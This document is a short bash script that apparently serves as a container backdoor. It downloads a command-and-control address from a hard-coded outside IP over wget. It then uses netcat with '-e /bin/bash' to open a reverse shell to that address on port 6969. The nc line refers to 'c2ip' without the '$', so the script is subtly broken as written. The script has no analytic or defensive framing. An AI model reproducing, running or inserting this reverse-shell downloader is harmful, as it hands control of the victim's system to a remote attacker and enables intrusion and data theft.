#!/bin/bash
wget -O /working/banana.txt http://165.227.22.122/dockerc2.txt
c2ip=$(</working/banana.txt)
nc c2ip 6969 -e /bin/bash
